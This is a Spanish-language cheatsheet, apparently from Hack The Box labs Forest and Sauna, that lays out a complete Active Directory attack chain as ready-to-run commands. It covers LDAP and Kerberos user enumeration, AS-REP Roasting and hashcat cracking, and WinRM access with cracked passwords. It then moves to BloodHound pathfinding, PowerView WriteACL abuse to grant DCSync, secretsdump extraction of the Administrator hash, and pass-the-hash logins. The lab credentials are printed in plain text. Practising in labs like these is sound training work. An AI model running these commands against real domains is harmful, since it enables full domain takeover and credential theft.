# Cheatsheet — Ataques a Active Directory (Forest & Sauna)

**Datos generales de las prácticas:**

- **Forest** — dominio `htb.local`
- **Sauna** — dominio `EGOTISTICAL-BANK.LOCAL` (10.129.95.180)

---

## 1. Enumeración

### Escaneo de puertos y servicios (Nmap)

```bash
nmap -sC -sV -p- -oN nmap-full.txt <IP>
```

- **Forest:** puertos relevantes → 53 (DNS), SMB, LDAP, HTTP. A través del servicio SMB se obtiene el nombre de dominio (`htb.local`) y se confirma que LDAP permite login anónimo.
- **Sauna:** puertos relevantes → 80 (HTTP/IIS), LDAP, SMB. Se obtiene el nombre de dominio `EGOTISTICAL-BANK.LOCAL`.

### Enumeración LDAP

Comprobación de bind anónimo y volcado de objetos:

```bash
ldapsearch -x -H ldap://<IP> -b "DC=htb,DC=local"
```

Enumeración de usuarios del dominio con **windapsearch** (repositorio: [ropnop/windapsearch](https://github.com/ropnop/windapsearch)):

```bash
python3 windapsearch.py --dc-ip <IP> -u "" -m users
```

Enumeración de **todos los objetos** del dominio (no solo usuarios), para tener una vista más amplia:

```bash
python3 windapsearch.py --dc-ip <IP> -u "" --custom "(objectClass=*)"
```

Enumeración LDAP alternativa con **Impacket** (`GetADUsers.py`):

```bash
GetADUsers.py -all -dc-ip <IP> <dominio>/ -no-pass
```

> 
> **Nota (Forest):** las cuentas de servicio con el prefijo `svc-` son buenas candidatas para probar **AS-REP Roasting**.
> 

### Enumeración SMB

```bash
smbmap -H <IP>  
smbclient -L //<IP>/ -N
```

En Sauna, ambas herramientas confirman login anónimo pero sin acceso a recursos compartidos con contenido útil.

### Enumeración web (solo Sauna)

Identificación de tecnología del servidor con **WhatWeb**:

```bash
whatweb http://<IP>
```

Fuzzing de directorios/archivos web:

```bash
gobuster dir -u http://<IP> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html
```

### Generación de nombres de usuario (solo Sauna)

Con los nombres reales obtenidos de la web, se generan posibles nombres de cuenta con **username-anarchy**:

```bash
./username-anarchy -i names.txt > userlist.txt
```

### Validación de usuarios del dominio (solo Sauna)

Comprobación de qué usuarios de la lista existen realmente y tienen la pre-autenticación de Kerberos deshabilitada, con **Kerbrute**:

```bash
kerbrute userenum -d egotistical-bank.local --dc <IP> userlist.txt
```

Resultado: el usuario válido con AS-REP Roasting posible es **fsmith**.

---

## 2. Explotación — AS-REP Roasting

La cuenta encontrada (Forest: `svc-alfresco`; Sauna: `fsmith`) tiene marcada la flag **"Do not require Kerberos preauthentication"**, lo que permite pedir su ticket TGT sin conocer la contraseña y crackearlo offline.

### Obtención del ticket AS-REP (Impacket `GetNPUsers.py`)

```bash
GetNPUsers.py <dominio>/ -usersfile users.txt -no-pass -dc-ip <IP>
```

O, conociendo ya el usuario exacto:

```
GetNPUsers.py <dominio>/fsmith -no-pass -dc-ip <IP>
```

### Crackeo del hash con Hashcat (modo 18200 = Kerberos 4768/AS-REP)

```bash
hashcat -m 18200 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
```

- **Forest:** cuenta `svc-alfresco` → contraseña `s3rvice`
- **Sauna:** cuenta `fsmith` → contraseña `Thestrokes23`

### Acceso remoto vía WinRM (puerto 5985) con evil-winrm

```bash
evil-winrm -i <IP> -u svc-alfresco -p 's3rvice'
```

```
evil-winrm -i <IP> -u fsmith -p 'Thestrokes23'
```

---

## 3. Escalada de privilegios

### Recolección de datos del dominio con BloodHound

**Opción A — subiendo `SharpHound.exe` al servidor (Forest):**

```powershell
upload SharpHound.exe  
.\SharpHound.exe -c All
```

Después se descarga el `.zip` generado y se importa en la interfaz de **BloodHound**.

**Opción B — recolección remota sin tocar el servidor, con `bloodhound-python` (Sauna):**

```bash
bloodhound-python -u fsmith -p 'Thestrokes23' -ns <IP> -d egotistical-bank.local -c All
```

Esta opción es más sigilosa porque no sube ningún ejecutable al objetivo.

### Búsqueda de credenciales locales con WinPEAS

```powershell
.\winPEASx64.exe
```

Permite confirmar la existencia de credenciales de **AutoLogon** almacenadas en el registro: usuario `svc_loanmanager` / contraseña `Moneymakestheworldgoround!`.

### Análisis en BloodHound

En ambos casos, usando la opción **"Find Shortest Path to High Value Targets"** se identifica una ruta de escalada:

- **Forest:** el grupo **"Exchange Windows Permissions"** tiene permiso `WriteACL` sobre el objeto raíz del dominio.
- **Sauna:** la cuenta **`svc_loanmanager`** tiene directamente permisos de replicación (**DCSync**) sobre el dominio.

### Abuso de WriteACL con PowerView (solo Forest)

Subida e importación de **PowerView.ps1** (obsoleto frente a muchos AV modernos por firma conocida):

```powershell
upload PowerView.ps1  
Import-Module .\PowerView.ps1
```

Creación de un nuevo usuario y adición a los grupos necesarios:

```powershell
net user alex alex!123 /add /domain  
Add-DomainGroupMember -Identity "Exchange Windows Permissions" -Members alex  
Add-DomainGroupMember -Identity "Remote Management Users" -Members alex
```

Concesión de derechos de replicación (DCSync) al nuevo usuario, abusando del `WriteACL` heredado del grupo "Exchange Windows Permissions":

```
Add-DomainObjectAcl -TargetIdentity "DC=htb,DC=local" -PrincipalIdentity alex -Rights DCSync
```

### Extracción de hashes vía DCSync con Impacket `secretsdump.py`

**Forest** (con el usuario `alex` recién creado):

```bash
secretsdump.py htb.local/alex:'alex!123'@<IP> -just-dc-user Administrator
```

**Sauna** (directamente con `svc_loanmanager`, que ya tenía DCSync):

```bash
secretsdump.py egotistical-bank.local/svc_loanmanager:'Moneymakestheworldgoround!'@<IP> -just-dc-user Administrator
```

> 
> Acceso final como Administrador (Pass-the-Hash)  


Con el hash NTLM del Administrador ya obtenido, conexión directa sin necesitar la contraseña en claro:

```bash
evil-winrm -i <IP> -u Administrator -H <hash_NTLM>
```

o, alternativamente, con Impacket:

```bash
psexec.py administrator@<IP> -hashes :<hash_NTLM>
```

##   

 
